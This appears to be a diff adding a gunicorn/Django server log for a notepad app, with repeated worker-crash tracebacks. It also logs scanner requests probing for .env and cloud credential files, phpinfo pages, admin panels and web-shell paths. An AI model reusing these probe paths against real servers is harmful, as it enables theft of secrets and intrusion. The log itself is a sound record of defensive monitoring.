+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-27 04:13:09 +0800] [1717037] [INFO] Worker exiting (pid: 1717037)
+[2025-05-27 04:13:09 +0800] [1736517] [INFO] Booting worker with pid: 1736517
+Not Found: /boaform/admin/formLogin
+Not Found: /api/client/update
+[2025-05-27 07:58:15 +0800] [1736517] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-27 08:00:03 +0800] [1736517] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-27 08:19:11 +0800] [1736517] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /geoserver
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /.well-known/security.txt
+[2025-05-27 11:15:47 +0800] [1736517] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-27 11:40:41 +0800] [1736517] [WARNING] Invalid request from ip=159.65.175.234: Invalid HTTP request line: 'SSH-2.0-OpenSSH'
+Not Found: /favicon.ico
+[2025-05-27 12:20:37 +0800] [1736517] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-27 12:20:37 +0800] [1736517] [INFO] Worker exiting (pid: 1736517)
+[2025-05-27 12:20:37 +0800] [3846911] [ERROR] Worker (pid:1736517) exited with code 255
+[2025-05-27 12:20:37 +0800] [3846911] [ERROR] Worker (pid:1736517) exited with code 255.
+[2025-05-27 12:20:37 +0800] [1886590] [INFO] Booting worker with pid: 1886590
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /webui/
+[2025-05-27 14:09:33 +0800] [1886590] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /geoserver/web/
+[2025-05-27 14:21:01 +0800] [1886590] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /robots.txt
+Not Found: /boaform/admin/formLogin
+[2025-05-27 16:06:32 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1886590)
+[2025-05-27 16:06:32 +0800] [1886590] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-27 16:06:32 +0800] [1886590] [INFO] Worker exiting (pid: 1886590)
+[2025-05-27 16:06:32 +0800] [1956406] [INFO] Booting worker with pid: 1956406
+Not Found: /druid/index.html
+[2025-05-27 16:58:08 +0800] [1956406] [WARNING] Invalid request from ip=45.142.193.4: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ping.js
+[2025-05-27 18:53:35 +0800] [1956406] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ugcbdy.gtimg.com/svp_50112/gzc_1000102_0b53juaacaaayqaaygqsibrmatodafaqabka.f10217.mp4
+Not Found: /ugcbdy.gtimg.com/svp_50112/gzc_1000102_0b53juaacaaayqaaygqsibrmatodafaqabka.f10217.mp4
+Not Found: /shell
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[2025-05-27 22:45:07 +0800] [1956406] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-27 22:45:07 +0800] [1956406] [INFO] Worker exiting (pid: 1956406)
+[2025-05-27 22:45:07 +0800] [3846911] [ERROR] Worker (pid:1956406) exited with code 255
+[2025-05-27 22:45:07 +0800] [3846911] [ERROR] Worker (pid:1956406) exited with code 255.
+[2025-05-27 22:45:07 +0800] [2079104] [INFO] Booting worker with pid: 2079104
+Not Found: /favicon.ico
+Not Found: /phpmyadmin/index.php
+Not Found: /pmd/index.php
+Not Found: /phpmyadmin4.8.5/index.php
+Not Found: /ugccsy.qq.com/svp_50112/gzc_1000102_0b53juaacaaayqaaygqsibrmatodafaqabka.f10217.mp4
+Not Found: /ugccsy.qq.com/svp_50112/gzc_1000102_0b53juaacaaayqaaygqsibrmatodafaqabka.f10217.mp4
+Not Found: /developmentserver/metadatauploader
+[2025-05-28 00:43:12 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /robots.txt
+[2025-05-28 01:44:08 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.env
+Not Found: /.env
+Not Found: /.env.save
+Not Found: /.env.save
+Not Found: /.env.old
+Not Found: /.env.prod
+Not Found: /.env.prod
+Not Found: /.env.production
+Not Found: /.env.production
+Not Found: /.env.development 
+Not Found: /.env.development 
+Not Found: /laravel/.env 
+Not Found: /laravel/.env 
+Not Found: /admin-app/.env 
+Not Found: /admin-app/.env 
+Not Found: /api/.env
+Not Found: /api/.env
+Not Found: /app/.env 
+Not Found: /app/.env 
+Not Found: /development/.env 
+Not Found: /development/.env 
+Not Found: /apps/.env 
+Not Found: /apps/.env 
+Not Found: /cp/.env
+Not Found: /cp/.env
+Not Found: /private/.env
+Not Found: /private/.env
+Not Found: /system/.env
+Not Found: /system/.env
+Not Found: /redmine/.env
+Not Found: /redmine/.env
+Not Found: /docker/.env
+Not Found: /docker/.env
+Not Found: /cms/.env
+Not Found: /cms/.env
+Not Found: /live_env 
+Not Found: /live_env 
+Not Found: /application/.env
+Not Found: /application/.env
+Not Found: /.env.project 
+Not Found: /.env.project 
+Not Found: /.env.dist
+Not Found: /.env.dist
+Not Found: /back/.env
+Not Found: /back/.env
+Not Found: /core/.env
+Not Found: /core/.env
+Not Found: /docker/.env
+Not Found: /docker/.env
+Not Found: /fedex/.env
+Not Found: /fedex/.env
+Not Found: /__tests__/test-become/.env
+Not Found: /__tests__/test-become/.env
+Not Found: /local/.env
+Not Found: /local/.env
+Not Found: /rest/.env
+Not Found: /rest/.env
+Not Found: /shared/.env 
+Not Found: /shared/.env 
+Not Found: /sources/.env
+Not Found: /sources/.env
+Not Found: /enviroments/.env.production
+Not Found: /enviroments/.env.production
+Not Found: /enviroments/.env
+Not Found: /enviroments/.env
+Forbidden (CSRF cookie not set.): /
+Not Found: /frontend_dev.php/$
+Not Found: /debug/default/view
+Not Found: /debug/default/view
+Not Found: /debug/default/view.html
+Not Found: /debug/default/view
+Not Found: /web/debug/default/view
+Not Found: /sapi/debug/default/view
+Not Found: /config.json
+Not Found: /AwsConfig.json
+Not Found: /awsconfig.json
+Not Found: /aws.json
+Not Found: /conf.json
+Not Found: /env.json
+Not Found: /.vscode/sftp.json
+Not Found: /.json
+Not Found: /db.json
+Not Found: /sendgrid.json
+Not Found: /ws-config.json
+Not Found: /_wpeprivate/config.json
+Not Found: /deployment-config.json
+Not Found: /sftp-config.json
+Not Found: /db/robomongo.json
+Not Found: /robomongo.json
+Not Found: /client_secrets.json
+Not Found: /user-config.json
+Not Found: /ssh-config.json
+Not Found: /database-config.json
+Not Found: /config/default.json
+Not Found: /config/config.json
+Not Found: /credentials/config.json
+Not Found: /assets/env.js
+Not Found: /config/config.js
+Not Found: /web/config.js
+Not Found: /src/config.js
+Not Found: /src/api/config.js
+Not Found: /web/api/config.js
+Not Found: /env.dev.js
+Not Found: /env.development.js
+Not Found: /env.js
+Not Found: /..;/env.dev.js
+Not Found: /..;/env.development.js
+Not Found: /..;/env.js
+Not Found: /..;/env.prod.js
+Not Found: /..;/env.production.js
+Not Found: /config.js
+Not Found: /api/config.js
+Not Found: /app/config.js
+Not Found: /.aws/credentials
+Not Found: /app_dev.php/_profiler/open
+Not Found: /_profiler/open
+Not Found: /app/config/parameters.yml
+Not Found: /config/parameters.yml
+Not Found: /parameters.yml
+Not Found: /_profiler/phpinfo
+Not Found: /app_dev.php/_profiler/phpinfo
+Not Found: /phpinfo.php
+Not Found: /info.php
+Not Found: /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
+Not Found: /phpinfo
+Not Found: /symfony/public/_profiler/phpinfo
+Not Found: /html/phpinfo.php
+Not Found: /__info.php
+Not Found: /_info-backoffice.php
+Not Found: /_info.php
+Not Found: /_phpinf.php
+Not Found: /_phpinfo.php
+Not Found: /_poopinfo.php
+Not Found: /.__info.php
+Not Found: /.info.php
+Not Found: /0.0_phpinfo.php
+Not Found: /00_server_info.php
+Not Found: /02-info.php
+Not Found: /1_1_PhpInfo.php
+Not Found: /5info.php
+Not Found: /api/index.php/v1/config/application
+Not Found: /ping.js
+[2025-05-28 04:01:57 +0800] [2079104] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /Iq4n
+Not Found: /Zbh9
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+[2025-05-28 06:03:25 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-28 07:38:38 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.env
+Not Found: /actuator/health
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /webui/
+Not Found: /Zf4h
+Not Found: /EoQX
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /Zf4h
+Not Found: /aab8
+Not Found: /geoserver/web/
+[2025-05-28 12:27:00 +0800] [2079104] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /443
+[2025-05-28 13:34:11 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-28 14:44:28 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /v1/models
+Not Found: /login/stylesheets/theme.css
+Not Found: /index.php
+Not Found: /index.php
+Not Found: /login/stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /stylesheets/theme.css
+Not Found: /stylesheets/theme.css
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /index.php
+Not Found: /ips/index.php
+Not Found: /ips/index.php
+Not Found: /ips/index.php
+Not Found: /ips/index.php
+Not Found: /index.php
+[2025-05-28 18:00:22 +0800] [2079104] [WARNING] Invalid request from ip=45.142.193.4: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-28 19:05:58 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /hudson
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /t4
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /form.html
+Not Found: /geoip/
+[2025-05-28 21:12:37 +0800] [2079104] [WARNING] Invalid request from ip=39.98.71.84: Invalid HTTP request line: ''
+Not Found: /ping.js
+Not Found: /api/v2/heartbeat
+Not Found: /api/v2/heartbeat
+[2025-05-29 01:52:25 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-29 03:15:06 +0800] [2079104] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /20:8080
+Not Found: /login
+Not Found: /developmentserver/metadatauploader
+[2025-05-29 08:02:52 +0800] [2079104] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-29 08:30:58 +0800] [2079104] [WARNING] Invalid request from ip=223.113.128.156: Invalid HTTP request line: ''
+Not Found: /favicon.ico
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+[2025-05-29 08:41:56 +0800] [2079104] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /t4
+Not Found: /systembc/password.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /password.php
+Not Found: /odinhttpcall1748485845
+Not Found: /sdk
+Not Found: /HNAP1
+Not Found: /evox/about
+Not Found: /solr/admin/info/system
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+[2025-05-29 12:11:15 +0800] [2079104] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-29 12:15:21 +0800] [2079104] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+[2025-05-29 12:53:30 +0800] [2079104] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-29 12:53:30 +0800] [2079104] [INFO] Worker exiting (pid: 2079104)
+[2025-05-29 12:53:30 +0800] [3846911] [ERROR] Worker (pid:2079104) exited with code 255
+[2025-05-29 12:53:30 +0800] [3846911] [ERROR] Worker (pid:2079104) exited with code 255.
+[2025-05-29 12:53:30 +0800] [2784066] [INFO] Booting worker with pid: 2784066
+Not Found: /favicon.ico
+[2025-05-29 14:51:01 +0800] [2784066] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-29 16:27:06 +0800] [2784066] [WARNING] Invalid request from ip=45.142.193.4: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-29 18:01:48 +0800] [2784066] [WARNING] Invalid request from ip=185.170.144.3: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /f1Zk
+Not Found: /v2bS
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /20:8080
+[2025-05-29 19:54:02 +0800] [2784066] [WARNING] Invalid request from ip=3.149.59.26: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-05-29 20:35:22 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2784066)
+[2025-05-29 20:35:22 +0800] [2784066] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-29 20:35:22 +0800] [2784066] [INFO] Worker exiting (pid: 2784066)
+[2025-05-29 20:35:22 +0800] [2926239] [INFO] Booting worker with pid: 2926239
+Not Found: /favicon.ico
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /form.html
+Not Found: /t4
+Not Found: /geoip/
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /upl.php
+Not Found: /1.php
+Not Found: /ReportServer
+Not Found: /.env
+Not Found: /.env.local
+Not Found: /_profiler/phpinfo
+Forbidden (CSRF cookie not set.): /
+[2025-05-30 00:50:00 +0800] [2926239] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ywotttv.bj.chinamobile.com/PLTV/88888888/224/3221226895/1.m3u8
+Not Found: /aaa9
+Not Found: /aab9
+[2025-05-30 02:54:19 +0800] [2926239] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /gateway/actuator
+Not Found: /actuator
+Not Found: /api/actuator
+Not Found: /config/actuator
+Not Found: /gate/actuator
+Not Found: /api/v1/actuator
+Not Found: /java/v1/actuator
+Not Found: /robots.txt
+Not Found: /version
+Not Found: /v1
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078201.m3u8
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078203.m3u8
+Not Found: /hlslive-tx-cdn.ysp.cctv.cn/ysp/2024078202.m3u8
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /geoip/
+Not Found: /systembc/password.php
+Not Found: /1.php
+Not Found: /password.php
